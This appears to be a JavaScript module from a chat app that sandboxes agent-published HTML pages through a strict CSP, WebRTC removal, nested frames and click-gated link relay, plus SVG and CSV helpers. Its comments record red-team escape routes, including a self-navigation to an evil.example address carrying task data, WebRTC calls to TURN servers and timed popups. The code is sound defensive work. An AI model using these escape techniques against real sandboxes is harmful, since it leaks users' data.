// What a chat published or SHOWED the owner (PublishedPages.jsx), the parts with no React in them.

// NO NETWORK for a page (PublishedPages.SANDBOX gives it an opaque origin, which can still fetch): a page could carry what it was given - the task's figures - to any
// server, or knock on this app's own port. The policy goes in first and a script cannot lift it. Libraries may still load
// from the public CDNs Claude's own artifacts use; a request to one carries nothing anybody else reads.
const CDNS = "https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://unpkg.com";
export const CSP = `default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval' data: blob: ${CDNS}; `
  + `style-src 'unsafe-inline' data: ${CDNS} https://fonts.googleapis.com; font-src data: ${CDNS} https://fonts.gstatic.com; `
  + "img-src data: blob:; media-src data: blob:; connect-src 'none'; form-action 'none'; base-uri 'none'";
// ...AND NO PEER CONNECTION, NO WINDOW OF ITS OWN (the red team, round 3): Chromium keeps no policy over WebRTC, so a page's
// RTCPeerConnection reached a TURN server of its choosing with no click, and a popup it opened was a fresh window to build one in, or an
// outside address carrying what the owner typed. Ahead of the page's own scripts its realm loses WebRTC; it has no other (no popups in
// SANDBOX, no frames under default-src 'none'), and a link it holds or a window it opens is asked of the app's own outside-link road (outsideLink)
const PRELUDE = "<script>(()=>{const w=window;for(const k of ['RTCPeerConnection','webkitRTCPeerConnection','RTCIceTransport'])delete w[k];"
  + "const out=(u)=>{try{u=new URL(String(u??''),document.baseURI).href}catch{return}if(/^https?:/i.test(u))parent.postMessage({tqOpen:u},'*')};"
  + "Object.defineProperty(w,'open',{value:(u)=>{out(u);return null}});"
  + "w.addEventListener('click',(e)=>{const a=e.target instanceof Element&&e.target.closest('a[href]');"
  + "if(a&&/^https?:/i.test(a.href)){e.preventDefault();if(e.isTrusted)out(a.href)}},true)})()</script>";
// after a doctype (before it the page would fall into quirks mode), ahead of everything the page says
export const lockDown = (html) => {
  const meta = `<meta http-equiv="Content-Security-Policy" content="${CSP}">${PRELUDE}`;
  const m = /^\s*<!doctype[^>]*>/i.exec(html || "");
  return m ? m[0] + meta + html.slice(m[0].length) : meta + (html || "");
};
// ...AND NOWHERE TO GO (the red team, 2026-11-24, T8a): a page may still navigate ITSELF - location = "https://evil.example/?d=<the task's
// figures>", with no click - and nothing in its own policy stops that. Its frame's PARENT's frame-src does, so the page is drawn inside a
// frame of its own whose one rule is frame-src 'none' (a srcdoc frame takes on its parent's policy too, so the page's scripts run as before)
export const SANDBOX = "allow-scripts";
const attr = (s) => String(s).replace(/&/g, "&amp;").replace(/"/g, "&quot;");
// ...the frame between hands on what its page asks to open, and nothing else (PRELUDE) - and only on a press IN the page (red team round 4: a
// mail's .html attachment asked on a clock, and the owner's next click anywhere in the app opened it - the app's own window counts any click).
// A click in the page wakes this frame, its parent; one in the app does not, for this frame is of another origin (HTML's activation rules)
export const RELAY = "<script>onmessage=(e)=>{const u=e.source===frames[0]&&e.data&&e.data.tqOpen,a=navigator.userActivation;"
  + "if(typeof u==='string'&&a&&a.isActive)parent.postMessage({tqOpen:u},'*')}</script>";
export const shut = (html) => `<!doctype html><meta http-equiv="Content-Security-Policy" content="frame-src 'none'">`
  + `<style>html,body{margin:0;height:100%;overflow:hidden}iframe{border:0;width:100%;height:100%;display:block}</style>${RELAY}`
  + `<iframe sandbox="${SANDBOX}" srcdoc="${attr(lockDown(html))}"></iframe>`;
// THE ADDRESS A PAGE ASKED TO OPEN, from its frame's message - "" for anything else: another window's message, no web address, or no press
// of the owner's just now (the page can post whenever it likes; a link it holds opens on his click, in his browser, as a chat's link does),
// and never this app's own address: a page's relative link resolves against it
export const outsideLink = (e, frame, active = globalThis.navigator?.userActivation?.isActive, own = globalThis.location?.origin) => {
  const u = e?.source && e.source === frame && e.data && e.data.tqOpen;
  if (typeof u !== "string" || !/^https?:\/\//i.test(u) || active === false) return "";
  try { return new URL(u).origin === own ? "" : u; } catch { return ""; }
};
// A WIDE PICTURE FITS ITS FRAME (the stress test, 2026-11-02): an SVG goes through the page frame (PublishedPages.isPicture) and drew at its
// own width - 1600 across a 600 frame scrolled sideways. Shrunk to the frame's width, its height following; a fixed width and height with no
// viewBox would only crop, so they become its viewBox. The file's own prolog (<?xml ?>, its DOCTYPE) is dropped for the page's
export const fitSvg = (svg) => {
  const s = String(svg || "").replace(/^\s*(?:<\?xml[^>]*\?>\s*|<!doctype[^>]*>\s*|<!--[\s\S]*?-->\s*)*/i, "");
  const num = (a, k) => (new RegExp(`\\s${k}\\s*=\\s*["']?\\s*([\\d.]+)(?:px)?\\s*["']?(?=[\\s/]|$)`, "i").exec(a) || [])[1];
  const fit = s.replace(/<svg\b([^>]*)>/i, (m, a) => (/\sviewBox\s*=/i.test(a) || !num(a, "width") || !num(a, "height") ? m
    : `<svg viewBox="0 0 ${num(a, "width")} ${num(a, "height")}"${a}>`));
  return `<!doctype html><style>html,body{margin:0;overflow-x:hidden}svg{display:block;max-width:100%;height:auto;margin:0 auto}</style>${fit}`;
};
// a CSV the agent made, as a table: quoted fields, doubled quotes, commas and newlines inside quotes
export function csvRows(text) {
  const rows = [[]];
  let field = "", quoted = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (quoted) {
      if (c === '"' && text[i + 1] === '"') { field += '"'; i++; }
      else if (c === '"') quoted = false;
      else field += c;
    } else if (c === '"') quoted = true;
    else if (c === ",") { rows.at(-1).push(field); field = ""; }
    else if (c === "\n" || c === "\r") {
      if (c === "\r" && text[i + 1] === "\n") i++;
      rows.at(-1).push(field); field = ""; rows.push([]);
    } else field += c;
  }
  rows.at(-1).push(field);
  return rows.filter((r) => r.length > 1 || r[0] !== "");
}

// what was published or shown, under the answer that made it - and one no answer in the thread holds is not drawn in the chat (the owner,
// 2026-11-13: nothing is pinned at its foot); it stays in the task's files
export const placeShown = (published, messages) => {
  const ids = new Set((messages || []).map((m) => m.id)), by = {};
  for (const p of published || []) if (p.after && ids.has(p.after)) (by[p.after] ||= []).push(p);
  return { by };
};
